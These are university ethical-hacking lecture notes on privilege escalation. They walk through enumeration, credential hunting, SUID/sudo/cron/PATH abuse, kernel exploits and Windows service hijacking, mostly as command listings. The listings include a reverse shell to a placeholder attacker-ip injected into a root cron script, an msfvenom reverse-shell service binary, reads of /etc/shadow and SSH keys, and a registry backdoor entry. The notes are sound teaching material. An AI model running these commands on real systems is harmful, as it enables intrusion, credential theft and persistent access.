# Week 11 — Privilege Escalation

**Module:** UOP M31880 — Ethical Hacking
**Lecturer:** Tobi Fajana

---

## Overview

Privilege escalation is a critical phase in penetration testing that occurs after gaining initial access to a system. This session covers the methodologies, tools, and techniques used to elevate privileges from a low-privileged user to higher levels of access (vertical escalation) or move laterally between accounts at the same privilege level (horizontal escalation).

**Key Topics:**
- Horizontal Privilege Escalation
- Vertical Privilege Escalation
- Enumeration Methodologies
- Automated and Manual Tools

---

## Understanding Privilege Escalation

### The Analogy: Computer as a House

> "Liken a computer to a house. What steps will a thief take after gaining unauthorized access?"

After breaking into a house, a thief would:
1. Assess their current position and capabilities
2. Explore the environment to understand the layout
3. Look for valuable items (sensitive information)
4. Find ways to access locked rooms (escalate privileges)
5. Avoid detection while maximizing access

This mirrors the privilege escalation process in cybersecurity.

### Every Attack is Privilege Escalation

From the moment an attacker gains any form of unauthorized access, they are performing privilege escalation:
- Exploiting a web vulnerability → User-level access
- User-level access → Root/Administrator access
- Compromising one account → Accessing other accounts (horizontal)
- Local access → Domain administrator access

---

## Types of Privilege Escalation

### Horizontal Privilege Escalation

**Definition:** Moving between different user accounts at the same privilege level.

**Examples:**
- User A accessing User B's account (both standard users)
- Accessing another employee's email account
- Using stolen credentials to switch between accounts

**Common Techniques:**
- Password reuse
- Session hijacking
- Cookie theft
- IDOR (Insecure Direct Object Reference) vulnerabilities

### Vertical Privilege Escalation

**Definition:** Escalating from a lower privilege level to a higher privilege level.

**Examples:**
- Standard user → Root/Administrator
- Web server user (www-data) → Root
- Local user → Domain Administrator

**Common Techniques:**
- Kernel exploits
- SUID/GUID binary abuse
- Sudo misconfigurations
- Scheduled task exploitation
- Service misconfigurations

### Lateral Privilege Escalation (Windows)

**Definition:** Moving between different systems in a network while maintaining or escalating privileges.

**Examples:**
- Compromising one workstation to access another
- Using stolen credentials to authenticate to other systems
- Pass-the-Hash attacks
- Pivoting through network segments

---

## Penetration Testing Context

### Pentest Recap

**Types of Penetration Tests:**
- **Black Box:** No prior knowledge of the target
- **Grey Box:** Partial knowledge (e.g., user credentials, network diagrams)
- **White Box:** Full knowledge and access to documentation

**Characteristics:**
- Fixed timeframe (typically 1-4 weeks for most engagements)
- Defined scope and rules of engagement
- Goal: Identify and exploit vulnerabilities within constraints

### Common Challenges

Pentesting can be daunting due to:
- **Overwhelming enumeration:** Massive amounts of data to sift through
- **Uncertainty:** Not knowing which findings are exploitable
- **Failed exploits:** Many attempts will not work
- **System instability:** Crashed systems and crashed exploits
- **Time pressure:** Limited time to achieve objectives

### The "Try Harder!" Philosophy

The OSCP (Offensive Security Certified Professional) motto: **"Try Harder!"**

**Practice Platforms:**
- **TryHackMe:** Guided learning paths and hands-on labs
- **HackTheBox:** Challenge-based vulnerable machines
- **VulnHub:** Downloadable vulnerable VMs

**Key mindset:**
- Persistence is essential
- Enumeration is never complete
- Document everything
- Learn from failed attempts

---

## The 7 Key Questions for Privilege Escalation

After gaining initial access to a system, systematically answer these questions:

---

### 1. WHO AM I?

**Objective:** Understand your current user context and privileges.

**Linux Commands:**

```bash
# Identify current user
whoami

# Display user and group information
id

# Check sudo privileges
sudo -l

# List all sudo rights for current user
sudo -v

# Check group memberships
groups

# View detailed user information
cat /etc/passwd | grep $(whoami)
```

**Windows Commands:**

```cmd
# Current user
whoami

# User privileges
whoami /priv

# Group memberships
whoami /groups

# All user details
net user %username%
```

**Key Questions:**
- What user am I running as?
- What groups am I a member of?
- Do I have sudo/administrator rights?
- Can I get a shell? An interactive TTY shell?
- Can I break out of a restricted shell?

**Shell Upgrades:**

```bash
# Python TTY shell upgrade
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# After spawning shell, make it fully interactive:
# Press Ctrl+Z to background the shell
stty raw -echo; fg
# Then press Enter twice
export TERM=xterm-256color
stty rows 38 columns 116  # Adjust to your terminal size

# Perl shell
perl -e 'exec "/bin/bash";'

# Ruby shell
ruby -e 'exec "/bin/bash"'

# Using script command
script -qc /bin/bash /dev/null
```

---

### 2. WHAT IS MY ENVIRONMENT?

**Objective:** Gather detailed information about the operating system, kernel version, and available tools.

**Linux Commands:**

```bash
# OS information
cat /etc/issue
cat /etc/*-release
lsb_release -a

# Kernel version (important for kernel exploits)
uname -a
uname -r
cat /proc/version

# Architecture
uname -m
arch

# Environment variables
env
printenv
cat /etc/environment

# Available programming languages and tools
which python python2 python3
which perl ruby gcc cc make wget curl nc netcat nmap
dpkg -l  # Debian/Ubuntu
rpm -qa  # RedHat/CentOS
```

**Windows Commands:**

```cmd
# System information
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Environment variables
set

# Installed software
wmic product get name,version
dir "C:\Program Files"
dir "C:\Program Files (x86)"

# PowerShell version
$PSVersionTable
```

**Kernel Exploit Enumeration:**

```bash
# Search for kernel exploits using searchsploit
searchsploit linux kernel $(uname -r)
searchsploit ubuntu kernel 4.4.0

# Example output search for specific vulnerabilities
searchsploit "privilege escalation" linux kernel

# Check for Dirty COW vulnerability (CVE-2016-5195)
# Affects Linux kernel versions 2.6.22 < 3.9
uname -r  # If kernel is in this range, potentially vulnerable
```

**WARNING:** Kernel exploits are inherently unstable and can crash the system. Use them as a last resort and only when you understand the risks.

**File Upload Methods:**

```bash
# Check available methods for uploading tools
which wget curl ftp nc python php perl ruby

# wget
wget http://attacker-ip/file -O /tmp/file

# curl
curl http://attacker-ip/file -o /tmp/file

# Python HTTP server (on attacker machine)
python3 -m http.server 8000

# Netcat file transfer
# On attacker: nc -lvnp 4444 < file
# On target: nc attacker-ip 4444 > /tmp/file

# Base64 encoding for text files
echo "base64-encoded-content" | base64 -d > /tmp/file
```

---

### 3. HOW DO USERS USE THE SYSTEM?

**Objective:** Understand user behavior, logged-in users, and historical activity.

**Linux Commands:**

```bash
# Last logged in users
last
lastlog

# Currently logged-in users
who
w

# Command history (goldmine for credentials and patterns)
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.php_history

# User home directories
ls -la /home/
cat /etc/passwd

# Active user sessions
ps aux | grep -i user

# Check for .viminfo files (can contain passwords)
find / -name ".viminfo" 2>/dev/null

# Profile and configuration files
cat ~/.bashrc
cat ~/.profile
cat /etc/profile
cat /etc/bash.bashrc
```

**Windows Commands:**

```cmd
# Logged-in users
query user
qwinsta

# Login history
wmic netlogin get name,lastlogon

# Command history (PowerShell)
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Recently accessed files
dir %APPDATA%\Microsoft\Windows\Recent\

# User profiles
dir C:\Users\
```

**Directory Services:**

```bash
# LDAP enumeration
ldapsearch -x -h target-ip -s base

# Active Directory information (Windows)
net user /domain
net group /domain
net group "Domain Admins" /domain
```

---

### 4. SENSITIVE INFORMATION

**Objective:** Locate credentials, configuration files, private keys, and other sensitive data.

**Usernames and Groups:**

```bash
# Linux
cat /etc/passwd
cat /etc/group
getent passwd
getent group

# Windows
net user
net localgroup administrators
```

**Password Hunting:**

```bash
# Search for "password" in files
grep -ri "password" /home/ 2>/dev/null
grep -ri "pwd" /var/www/ 2>/dev/null
grep -ri "pass" /etc/ 2>/dev/null

# Search in configuration files
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name "config.*" -exec grep -l "password" {} \; 2>/dev/null

# Common password file locations
cat /etc/shadow  # Requires root
cat /etc/security/passwd
cat ~/.ssh/id_rsa  # SSH private keys
cat ~/.ssh/authorized_keys

# Web application configs
cat /var/www/html/config.php
cat /var/www/html/wp-config.php  # WordPress
cat /var/www/html/.env  # Laravel and other frameworks

# Database connection strings
find / -name "*.php" -exec grep -l "mysql" {} \; 2>/dev/null
```

**Windows Password Locations:**

```cmd
# Unattended installation files
dir /s *unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml

# Group Policy Preferences (GPP) files
findstr /si "cpassword" C:\ProgramData\Microsoft\Group Policy\*.xml

# Registry credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s

# Saved RDP credentials
cmdkey /list

# Configuration files
dir /s /b *password*.txt
dir /s /b *password*.xml
dir /s /b *password*.ini
```

**SSH Private Keys:**

```bash
# Find SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Check permissions (if readable, copy and use)
ls -la ~/.ssh/
cat ~/.ssh/id_rsa

# Use found SSH keys
chmod 600 stolen_key
ssh -i stolen_key user@target
```

**Database Files:**

```bash
# SQLite databases
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null

# MySQL credentials
cat /etc/mysql/my.cnf
cat ~/.mysql_history

# PostgreSQL
cat ~/.psql_history
ls -la /var/lib/postgresql/
```

**Hidden Files and Directories:**

```bash
# Find all hidden files
find / -name ".*" -type f 2>/dev/null

# List hidden files in user directories
ls -la /home/*/
ls -la /root/

# Hidden directories in web roots
ls -la /var/www/html/
```

**Shared Directories:**

```bash
# NFS shares
cat /etc/exports
showmount -e target-ip

# SMB/CIFS shares (Windows)
net share
smbclient -L //target-ip -N

# World-writable directories
find / -perm -002 -type d 2>/dev/null
find / -perm -o+w -type d 2>/dev/null
```

---

### 5. PROCESSES AND SERVICES

**Objective:** Identify running processes, services running as root/SYSTEM, and exploitable software.

**Linux Commands:**

```bash
# All running processes
ps aux
ps -ef

# Processes running as root
ps aux | grep root
ps -ef | grep root

# View process tree
pstree -p

# Services and daemons
systemctl list-units --type=service
service --status-all

# Processes with elevated privileges
ps aux | grep -E "root|^root"

# Check for vulnerable software versions
dpkg -l | grep -i apache
dpkg -l | grep -i mysql
rpm -qa | grep httpd
```

**Windows Commands:**

```cmd
# All processes
tasklist
wmic process list brief

# Services
net start
sc query

# Services running as SYSTEM
wmic service where "StartName='LocalSystem'" get Name,DisplayName,State

# Scheduled tasks
schtasks /query /fo LIST /v

# PowerShell process information
Get-Process
Get-Service
```

**Exploiting Services:**

```bash
# Known vulnerable services
searchsploit <service-name> <version>

# Example: Exploit MySQL running as root
# If MySQL runs as root with user-defined functions (UDF)
mysql -u root -p
```

**Windows Service Exploitation:**

```cmd
# Check if you can install software or services
# Run command prompt as SYSTEM using PsExec
psexec -i -s cmd.exe

# Check service permissions
sc qc <service-name>
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
```

**Cron Jobs (Linux):**

```bash
# System-wide cron jobs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# User cron jobs
crontab -l
crontab -u username -l

# Check writable cron scripts
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
```

---

### 6. FILE PERMISSIONS

**Objective:** Identify misconfigured file permissions, SUID/GUID binaries, and writable files.

**Linux SUID/SGID Binaries:**

SUID (Set User ID) and SGID (Set Group ID) binaries execute with the permissions of the file owner rather than the user running them.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 -type f 2>/dev/null

# Common exploitable SUID binaries
# Check GTFOBins: https://gtfobins.github.io/
# Examples: nmap, vim, find, bash, more, less, nano, cp, mv

# Example: SUID find exploit
find /home -exec /bin/bash -p \;

# Example: SUID vim exploit
vim -c ':!/bin/bash'

# Example: SUID nmap (old versions)
nmap --interactive
!sh
```

**File and Directory Permissions:**

```bash
# World-writable files
find / -perm -002 -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# World-writable directories
find / -perm -002 -type d 2>/dev/null

# Files owned by specific user
find / -user root -perm -4000 2>/dev/null

# Files with no owner (good for exploitation)
find / -nouser -type f 2>/dev/null

# Writable config files
find /etc -writable -type f 2>/dev/null

# Check /etc/passwd writability (for privilege escalation)
ls -la /etc/passwd
ls -la /etc/shadow
```

**Linux Capabilities:**

```bash
# List files with capabilities
getcap -r / 2>/dev/null

# Common exploitable capabilities
# CAP_SETUID - can change UID
# Example: python with cap_setuid
# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Sticky Bit:**

```bash
# Find directories with sticky bit
find / -perm -1000 -type d 2>/dev/null

# Sticky bit prevents users from deleting files they don't own
# Even in world-writable directories like /tmp
```

**Mounted Filesystems:**

```bash
# View mounted filesystems
mount
cat /etc/fstab
df -h

# Look for:
# - NFS shares with no_root_squash
# - Mounted drives with weak permissions
# - USB drives or external media
```

**Windows File Permissions:**

```cmd
# Check file permissions
icacls "C:\Program Files\CustomApp\service.exe"

# Find writable files in Program Files
dir /s /q "C:\Program Files" | findstr /i "Users"

# Check service binary permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

---

### 7. NETWORKING

**Objective:** Map network configuration, identify internal services, and discover pivot opportunities.

**Network Configuration:**

```bash
# Linux - IP addresses and interfaces
ip addr
ifconfig
ip a

# MAC addresses
ip link show
cat /sys/class/net/*/address

# Routing table
ip route
route -n
netstat -rn

# DNS configuration
cat /etc/resolv.conf

# DHCP information
cat /var/lib/dhcp/dhclient.leases

# Proxy configuration
env | grep -i proxy
cat /etc/environment | grep -i proxy
```

**Windows Network Configuration:**

```cmd
# IP configuration
ipconfig /all

# Routing table
route print

# DNS cache
ipconfig /displaydns

# ARP cache
arp -a

# Network shares
net use
net view \\127.0.0.1
```

**Active Connections and Listening Ports:**

```bash
# Linux - Active connections
netstat -antup
ss -antup

# Listening services (especially on localhost)
netstat -antpl
ss -tlnp

# Look for services only accessible internally
# (MySQL on 3306, Redis on 6379, etc.)

# Who is communicating with this target?
lsof -i
netstat -an | grep ESTABLISHED
```

**Windows Connections:**

```cmd
# Active connections
netstat -ano

# Listening ports
netstat -an | findstr LISTENING

# Find process associated with port
netstat -ano | findstr :<port>
tasklist | findstr <PID>
```

**Firewall Rules:**

```bash
# Linux firewall status
iptables -L -n
ufw status

# Windows firewall
netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule name=all
```

**Port Forwarding and Tunneling:**

```bash
# SSH local port forwarding
# Access internal service through compromised host
ssh -L 8080:localhost:80 user@target-ip

# SSH remote port forwarding
# Expose local service to remote network
ssh -R 8080:localhost:80 user@attacker-ip

# SSH dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@target-ip

# Use with proxychains
proxychains nmap -sT -Pn internal-ip
```

**Packet Sniffing and ARP Poisoning:**

```bash
# TCPDump (requires root)
tcpdump -i eth0 -w capture.pcap

# Look for credentials in cleartext protocols
tcpdump -i eth0 -A | grep -i "pass"

# ARP cache
arp -a
ip neigh
```

**Network Scanning (from compromised host):**

```bash
# Ping sweep
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "bytes from"; done

# Port scanning with nc
nc -zv 192.168.1.1 1-1000

# Using internal tools
./nmap -sn 192.168.1.0/24  # If nmap is available
```

---

## Automation Tools

While manual enumeration is essential for understanding systems, automation tools can speed up the process and help identify potential vectors.

### Warning About Automation Tools

**Disadvantages:**
- **Noisy:** Generate significant logs and may trigger IDS/IPS
- **Incomplete:** May miss techniques or edge cases
- **Difficult cleanup:** Leave artifacts and temporary files
- **Detection risk:** Easily flagged by security tools

**Best Practice:** Use manual enumeration first, then supplement with targeted tool usage.

---

### Enumeration Tools

**SearchSploit:**

```bash
# Search for exploits locally (Exploit-DB)
searchsploit <software> <version>
searchsploit -u  # Update database

# Example
searchsploit apache 2.4.49
searchsploit linux kernel 4.4.0

# Copy exploit to current directory
searchsploit -m <exploit-id>
```

**unix-privesc-check:**

```bash
# Download
wget http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz

# Run standard checks
./unix-privesc-check standard

# Run detailed checks
./unix-privesc-check detailed
```

**LinPEAS (Linux Privilege Escalation Awesome Script):**

```bash
# Download
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Run
chmod +x linpeas.sh
./linpeas.sh

# With colors
./linpeas.sh -a

# Output to file
./linpeas.sh | tee linpeas_output.txt
```

**LinEnum:**

```bash
# Download
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Run
chmod +x LinEnum.sh
./LinEnum.sh

# Thorough mode
./LinEnum.sh -t
```

**WinPEAS (Windows Privilege Escalation Awesome Script):**

```cmd
# Download and run
winpeas.exe

# Quiet mode (less output)
winpeas.exe quiet

# Output to file
winpeas.exe > output.txt
```

**PowerSploit (PowerShell):**

```powershell
# Import module
Import-Module .\PowerSploit.psm1

# PowerUp module for Windows privilege escalation
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Check for unquoted service paths
Get-UnquotedService

# Check for vulnerable services
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
```

**Jaws (Just Another Windows Enum Script):**

```powershell
# Download and run
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1

# Output to file
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws_output.txt
```

**enum4linux (Linux/Samba enumeration):**

```bash
# Basic enumeration
enum4linux target-ip

# Detailed enumeration
enum4linux -a target-ip

# User enumeration
enum4linux -U target-ip

# Share enumeration
enum4linux -S target-ip
```

**Metasploit Framework:**

```bash
# Start Metasploit
msfconsole

# Local exploit suggester (after getting meterpreter session)
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Windows privilege escalation enumeration
use post/windows/gather/enum_patches
use post/windows/gather/enum_applications
use post/windows/gather/credentials/credential_collector

# Linux privilege escalation enumeration
use post/linux/gather/enum_configs
use post/linux/gather/checkvm
use post/linux/gather/enum_system
```

---

## Practical Techniques and Examples

### Linux Privilege Escalation Examples

**Sudo Exploitation:**

```bash
# Check sudo permissions
sudo -l

# Example vulnerable entry:
# (ALL) NOPASSWD: /usr/bin/find

# Exploit
sudo find /etc -exec /bin/bash \;

# GTFOBins reference for sudo exploits
# https://gtfobins.github.io/
```

**Cron Job Exploitation:**

```bash
# Find writable cron jobs
cat /etc/crontab
ls -la /etc/cron.d/

# If a script runs as root and is writable:
echo "bash -i >& /dev/tcp/attacker-ip/4444 0>&1" >> /vulnerable/script.sh

# Wait for cron to execute and catch reverse shell
nc -lvnp 4444
```

**PATH Exploitation:**

```bash
# If sudo runs a command without full path
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/custom_script
# And custom_script calls "ls" without full path

# Create malicious ls
cd /tmp
echo "/bin/bash" > ls
chmod +x ls

# Add /tmp to PATH
export PATH=/tmp:$PATH

# Run vulnerable sudo command
sudo /usr/bin/custom_script
```

**Kernel Exploits:**

```bash
# Check kernel version
uname -r

# Search for exploits
searchsploit linux kernel $(uname -r)

# Example: Dirty COW (CVE-2016-5195)
# Download exploit
wget https://www.exploit-db.com/download/40839 -O dirtycow.c

# Compile
gcc -pthread dirtycow.c -o dirtycow -lcrypt

# Run (WARNING: May crash system)
./dirtycow
```

### Windows Privilege Escalation Examples

**Unquoted Service Path:**

```cmd
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"

# Example vulnerable service:
# C:\Program Files\Custom App\service.exe

# Create malicious executable at:
# C:\Program.exe
# or C:\Program Files\Custom.exe

# Restart service
sc stop vulnerable_service
sc start vulnerable_service
```

**Service Binary Hijacking:**

```cmd
# Check service permissions
sc qc vulnerable_service

# Check file permissions
icacls "C:\Program Files\Service\service.exe"

# If writable, replace with malicious binary
# Create reverse shell executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f exe -o service.exe

# Replace original
move "C:\Program Files\Service\service.exe" "C:\Program Files\Service\service.exe.bak"
move service.exe "C:\Program Files\Service\service.exe"

# Restart service
sc stop vulnerable_service
sc start vulnerable_service
```

**Registry AutoRun Exploitation:**

```cmd
# Check registry autorun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# If writable, add malicious entry
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe"
```

---

## Recommended Reading

1. **Exploiting Software: How to Break Code** — McGraw-Hill
   Comprehensive guide to software exploitation techniques

2. **Shellcoding and Porting** — James Foster
   In-depth coverage of shellcode development and exploit porting

3. **The Hacker Playbook 3: Practical Guide to Penetration Testing** — Peter Kim
   Modern penetration testing techniques with hands-on examples

---

## Recommended TryHackMe Labs

| Lab Name | URL | Difficulty | Access | Description |
|----------|-----|------------|--------|-------------|
| Linux PrivEsc | https://tryhackme.com/room/linuxprivesc | Medium | Free | SUID, kernel exploits, cron jobs, sudo abuse, PATH exploitation |
| Common Linux Privesc | https://tryhackme.com/room/commonlinuxprivesc | Easy | Free | Enumeration, SUID, capabilities, NFS, writable scripts |
| Overpass | https://tryhackme.com/room/overpass | Easy | Free | Real CTF: cron job exploitation for privilege escalation |
| Vulnversity | https://tryhackme.com/room/vulnversity | Easy | Free | SUID binary exploitation for priv esc after initial foothold |
| Kenobi | https://tryhackme.com/room/kenobi | Easy | Free | Full attack chain: enumeration → exploitation → SUID priv esc |

---

## Key Takeaways

1. **Enumeration is Everything:** The more information you gather, the more attack vectors you'll identify
2. **Systematic Approach:** Follow the 7 key questions methodically
3. **Manual First, Automate Second:** Understand what you're looking for before using tools
4. **Persistence Pays:** Most systems have multiple privilege escalation paths
5. **Document Everything:** Track what you've tried and what you've found
6. **Be Cautious:** Kernel exploits and system modifications can crash systems
7. **Practice Regularly:** Use TryHackMe, HackTheBox, and VulnHub to build skills

**Remember:** "Try Harder!" — OSCP Motto

---

*Week 11 of 12 — UOP M31880 Ethical Hacking*
